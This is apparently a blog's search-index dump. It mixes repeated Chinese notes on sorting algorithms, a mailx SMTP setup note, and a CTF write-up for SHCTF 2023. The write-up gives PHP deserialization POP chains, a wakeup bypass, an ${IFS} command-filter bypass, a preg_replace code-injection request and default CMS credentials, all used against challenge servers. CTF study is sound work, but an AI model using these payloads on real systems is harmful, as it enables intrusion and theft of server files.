在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#算法分析-2"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#选择排序"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#简单选择排序"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#基本思想-3"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#基本操作-1"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#算法实现-6"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#算法分析-3"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#堆排序"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#堆的定义"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#堆排序-1"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#堆的调整"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#算法描述"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#堆的建立"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#堆排序实现原理"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#算法实现-7"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#性能分析-6"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#归并排序"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#基本思想-4"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#举例-1"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#关键问题"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#算法标识"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#算法分析-4"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#基数排序"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#基本思想-5"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#举例-2"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#算法分析-5"},{"categories":["notice"],"content":"\r各种排序方法的综合比较\r时间性能1.按平均的时间性能来分，有三类排序方法 时间复杂度为O(nlog2 n)的方法有： 快速排序、堆排序和归并排序，其中以快速排序为最好; 时间复杂度为O(n^2)的有： 直接插入排序、冒泡排序和简单选择排序，其中以直接插入为最好，特别是对那些对关键字近似有序的记录序列尤为如此； 时间复杂度为O(n)的排序方法只有: 基数排序 2.当待排记录序列按关键字顺序有序时，直接插入排序和冒泡排序能达到O(n)的时间复杂度;而对于快速排序而言，这是最不好的情况，此时的时间性能退化为O(n^2)，因此是应该尽量避免的情况。 3.简单选择排序、堆排序和归并排序的时间性能不随记录序列中关键字的分布而改变。 空间性能指的是排序过程中所需的辅助空间大小 1.所有的简单排序方法(包括：直接插入、冒泡和简单选择)和堆排序的空间复杂度为O(1) 2.快速排序为O(logn)，为栈所需的辅助空间 3.归并排序所需辅助空间最多，其空间复杂度为O(n) 4.链式基数排序需附设队列首尾指针，则空间复杂度为O(rd) 稳定性能稳定的排序方法指的是，对于两个关键字相等的记录，它们在序列中的相对位置，在排序之前和经过排序之后，没有改变。 当对多关键字的记录序列进行LSD方法排序时，必须采用稳定的排序方法。 对于不稳定的排序方法，只要能举出一个实例说明即可。 快速排序和堆排序是不稳定的排序方法。 \u003c–2023年12月5日–\u003e ①快速排序 ②复杂度 ③堆排序 希尔排序 归并排序 \u003c–2023年12月5日–\u003e总结 ①线性结构 ②树形结构（树，二叉树） ③图型结构（存储，算法） ④查找和排序 ","date":"2023-12-19","objectID":"/data_structure_notes/:8:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#各种排序方法的综合比较"},{"categories":["notice"],"content":"\r各种排序方法的综合比较\r时间性能1.按平均的时间性能来分，有三类排序方法 时间复杂度为O(nlog2 n)的方法有： 快速排序、堆排序和归并排序，其中以快速排序为最好; 时间复杂度为O(n^2)的有： 直接插入排序、冒泡排序和简单选择排序，其中以直接插入为最好，特别是对那些对关键字近似有序的记录序列尤为如此； 时间复杂度为O(n)的排序方法只有: 基数排序 2.当待排记录序列按关键字顺序有序时，直接插入排序和冒泡排序能达到O(n)的时间复杂度;而对于快速排序而言，这是最不好的情况，此时的时间性能退化为O(n^2)，因此是应该尽量避免的情况。 3.简单选择排序、堆排序和归并排序的时间性能不随记录序列中关键字的分布而改变。 空间性能指的是排序过程中所需的辅助空间大小 1.所有的简单排序方法(包括：直接插入、冒泡和简单选择)和堆排序的空间复杂度为O(1) 2.快速排序为O(logn)，为栈所需的辅助空间 3.归并排序所需辅助空间最多，其空间复杂度为O(n) 4.链式基数排序需附设队列首尾指针，则空间复杂度为O(rd) 稳定性能稳定的排序方法指的是，对于两个关键字相等的记录，它们在序列中的相对位置，在排序之前和经过排序之后，没有改变。 当对多关键字的记录序列进行LSD方法排序时，必须采用稳定的排序方法。 对于不稳定的排序方法，只要能举出一个实例说明即可。 快速排序和堆排序是不稳定的排序方法。 \u003c–2023年12月5日–\u003e ①快速排序 ②复杂度 ③堆排序 希尔排序 归并排序 \u003c–2023年12月5日–\u003e总结 ①线性结构 ②树形结构（树，二叉树） ③图型结构（存储，算法） ④查找和排序 ","date":"2023-12-19","objectID":"/data_structure_notes/:8:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#时间性能"},{"categories":["notice"],"content":"\r各种排序方法的综合比较\r时间性能1.按平均的时间性能来分，有三类排序方法 时间复杂度为O(nlog2 n)的方法有： 快速排序、堆排序和归并排序，其中以快速排序为最好; 时间复杂度为O(n^2)的有： 直接插入排序、冒泡排序和简单选择排序，其中以直接插入为最好，特别是对那些对关键字近似有序的记录序列尤为如此； 时间复杂度为O(n)的排序方法只有: 基数排序 2.当待排记录序列按关键字顺序有序时，直接插入排序和冒泡排序能达到O(n)的时间复杂度;而对于快速排序而言，这是最不好的情况，此时的时间性能退化为O(n^2)，因此是应该尽量避免的情况。 3.简单选择排序、堆排序和归并排序的时间性能不随记录序列中关键字的分布而改变。 空间性能指的是排序过程中所需的辅助空间大小 1.所有的简单排序方法(包括：直接插入、冒泡和简单选择)和堆排序的空间复杂度为O(1) 2.快速排序为O(logn)，为栈所需的辅助空间 3.归并排序所需辅助空间最多，其空间复杂度为O(n) 4.链式基数排序需附设队列首尾指针，则空间复杂度为O(rd) 稳定性能稳定的排序方法指的是，对于两个关键字相等的记录，它们在序列中的相对位置，在排序之前和经过排序之后，没有改变。 当对多关键字的记录序列进行LSD方法排序时，必须采用稳定的排序方法。 对于不稳定的排序方法，只要能举出一个实例说明即可。 快速排序和堆排序是不稳定的排序方法。 \u003c–2023年12月5日–\u003e ①快速排序 ②复杂度 ③堆排序 希尔排序 归并排序 \u003c–2023年12月5日–\u003e总结 ①线性结构 ②树形结构（树，二叉树） ③图型结构（存储，算法） ④查找和排序 ","date":"2023-12-19","objectID":"/data_structure_notes/:8:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#空间性能"},{"categories":["notice"],"content":"\r各种排序方法的综合比较\r时间性能1.按平均的时间性能来分，有三类排序方法 时间复杂度为O(nlog2 n)的方法有： 快速排序、堆排序和归并排序，其中以快速排序为最好; 时间复杂度为O(n^2)的有： 直接插入排序、冒泡排序和简单选择排序，其中以直接插入为最好，特别是对那些对关键字近似有序的记录序列尤为如此； 时间复杂度为O(n)的排序方法只有: 基数排序 2.当待排记录序列按关键字顺序有序时，直接插入排序和冒泡排序能达到O(n)的时间复杂度;而对于快速排序而言，这是最不好的情况，此时的时间性能退化为O(n^2)，因此是应该尽量避免的情况。 3.简单选择排序、堆排序和归并排序的时间性能不随记录序列中关键字的分布而改变。 空间性能指的是排序过程中所需的辅助空间大小 1.所有的简单排序方法(包括：直接插入、冒泡和简单选择)和堆排序的空间复杂度为O(1) 2.快速排序为O(logn)，为栈所需的辅助空间 3.归并排序所需辅助空间最多，其空间复杂度为O(n) 4.链式基数排序需附设队列首尾指针，则空间复杂度为O(rd) 稳定性能稳定的排序方法指的是，对于两个关键字相等的记录，它们在序列中的相对位置，在排序之前和经过排序之后，没有改变。 当对多关键字的记录序列进行LSD方法排序时，必须采用稳定的排序方法。 对于不稳定的排序方法，只要能举出一个实例说明即可。 快速排序和堆排序是不稳定的排序方法。 \u003c–2023年12月5日–\u003e ①快速排序 ②复杂度 ③堆排序 希尔排序 归并排序 \u003c–2023年12月5日–\u003e总结 ①线性结构 ②树形结构（树，二叉树） ③图型结构（存储，算法） ④查找和排序 ","date":"2023-12-19","objectID":"/data_structure_notes/:8:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#稳定性能"},{"categories":["web"],"content":"mailx配置outlook SMTP方式发送邮件 首先我们在outlook中查看SMTP信息 然后在/etc/mail.rc里加入账号等信息 在文件最后添加信息： 登录密码这里，为避免直接输入账户密码，可以在Microsoft安全设置中开启双重验证并添加一个应用密码 创建存放证书的目录 mkdir -p /etc/pki/nssdb/ 测试mail命令 echo \"testcontent\" | mailx -v -s \"testtitle\" scofield_1920@outlook.com testcontent 要发送的邮件内容，多行内容要写\"“里。 testtitle 发送邮件的标题。 scofield_1920@outlook.com 是对方接收邮件的账号。 -s 给邮件追加主题 -a 发送邮件附件，多个附件使用多次-a选项即可 -b 指定密件抄送的收信人地址 -c 指定抄送的收信人地址 -v 显示详细信息，一般是调试连通性的时候使用 在set smtp一栏一定要在域名后添加端口号，不然会出现以下情况： 正常状态： 在目标邮箱收到了测试邮件： ","date":"2023-12-06","objectID":"/mailx/:0:0","series":null,"tags":["web"],"title":"mailx通过外部SMTP发邮件","uri":"/mailx/#"},{"categories":["wp"],"content":"2023SHCTF联赛—工带第二届新生赛 作为组委会摆烂成员， 摸鱼水题出题人， 自己也稍微做了点 更详细的wp见官方wp： https://mp.weixin.qq.com/s/9Q176LuKQAhw7TlNg9vk4A ","date":"2023-11-25","objectID":"/shctf2023.10/:0:0","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#"},{"categories":["wp"],"content":"\rWEB","date":"2023-11-25","objectID":"/shctf2023.10/:1:0","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#web"},{"categories":["wp"],"content":"\r[WEEK1]1zzphp套路跟ctfshow web131差不多 import requests url=\"http://112.6.51.212:31610/?num[]=a\" data={ 'c_ode':'very'*250000+'2023SHCTF' } r=requests.post(url,data=data) print(r.text) ","date":"2023-11-25","objectID":"/shctf2023.10/:1:1","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#week11zzphp"},{"categories":["wp"],"content":"\r[WEEK1]ez_serialize \u003c?php class A{ public $var_1='php://filter/read=convert.base64-encode/resource=flag.php'; public function _invoke(){ ​ include($this-\u003evar_1); } } class B{ public $q; public function _wakeup(){ ​ $this-\u003eq=new A(); } } class C { public $var; public $z; public function _toString(){ return $this-\u003ez= new D(); } } class D{ public $p; public function __get($key){ ​ $function = $this-\u003ep = new A(); } } $pop=new B(); $pop-\u003eq=new C(); $pop-\u003eq-\u003ez=new D(); $pop-\u003eq-\u003ez-\u003ep=new A(); echo urlencode(serialize($pop)); ","date":"2023-11-25","objectID":"/shctf2023.10/:1:2","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#week1ez_serialize"},{"categories":["wp"],"content":"\r[WEEK1]babyRCEbp发包 GET /?rce=ca\\t${IFS}/fla? HTTP/1.1 Host: 112.6.51.212:31105 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close ","date":"2023-11-25","objectID":"/shctf2023.10/:1:3","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#week1babyrce"},{"categories":["wp"],"content":"\r[WEEK1]登录就给flag admin/password ","date":"2023-11-25","objectID":"/shctf2023.10/:1:4","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#week1登录就给flag"},{"categories":["wp"],"content":"\r[WEEK1]飞机大战右键查看源代码，查看JS代码 找到 解码得到flag ","date":"2023-11-25","objectID":"/shctf2023.10/:1:5","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#week1飞机大战"},{"categories":["wp"],"content":"\r[WEEK1]ezphp POST /?code=?.*=${phpinfo()} HTTP/1.1 Host: 112.6.51.212:31240 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 0 pattern=.* ","date":"2023-11-25","objectID":"/shctf2023.10/:1:6","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#week1ezphp"},{"categories":["wp"],"content":"\r[WEEK2]serialize \u003c?php class misca{ public $gao; public $fei; public $a; public function __get($key){ $this-\u003emiaomiao(); $this-\u003egao=$this-\u003efei; die($this-\u003ea); } public function miaomiao(){ $this-\u003ea='Mikey Mouse~'; } } class musca { public $ding; public $dong; public function __wakeup(){ return $this-\u003eding-\u003edong; } } class milaoshu{ public $v; public function __tostring(){ echo\"misca~musca~milaoshu~~~\"; include($this-\u003ev); } } function check($data){ if(preg_match('/^O:\\d+/',$data)){ die(\"you should think harder!\"); } else return $data; } $MI = new misca(); $MU = new musca(); $MIL = new milaoshu(); $MIL -\u003e v = 'php://filter/read=convert.base64-encode/resource=flag.php'; $MI -\u003e a =\u0026$MI -\u003e gao; $MI -\u003e gao ='1'; $MI -\u003e fei =$MIL; $MU -\u003e ding = $MI; $MU -\u003e dong = 'Arcueid'; echo serialize(array($MU)); ","date":"2023-11-25","objectID":"/shctf2023.10/:1:7","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#week2serialize"},{"categories":["wp"],"content":"\r[WEEK2]no_wake_up \u003c?php class flag { public $username = \"admin\"; public $code = \"php://filter/read=convert.base64-encode/resource=flag.php\"; public function _wakeup() { ​ $this-\u003eusername = \"admin\"; } public function __destruct() { ​ if ($this-\u003eusername = \"admin\") { ​ include($this-\u003ecode); ​ } } } $a= (serialize(new flag)); echo $a; 然后将payload中反序列化的成员数2改成比2大的数 GET /wakeup.php?try=O:4:\"flag\":3:{s:8:\"username\";s:5:\"admin\";s:4:\"code\";s:57:\"php://filter/read=convert.base64-encode/resource=flag.php\";} HTTP/1.1 Host: 112.6.51.212:30930 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: http://112.6.51.212:30930/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Base解码得到flag ","date":"2023-11-25","objectID":"/shctf2023.10/:1:8","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#week2no_wake_up"},{"categories":["wp"],"content":"\r[WEEK2]EasyCMS进入url/admin/admin.php 查到taoCMS登录弱口令admin/tao 随后在文件管理处找到flag位置 ","date":"2023-11-25","objectID":"/shctf2023.10/:1:9","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#week2easycms"},{"categories":["wp"],"content":"\r[WEEK2]ez_ssti（这个payload push不上去，只能上截图了） [WEEK1]生成你的邀请函吧~ 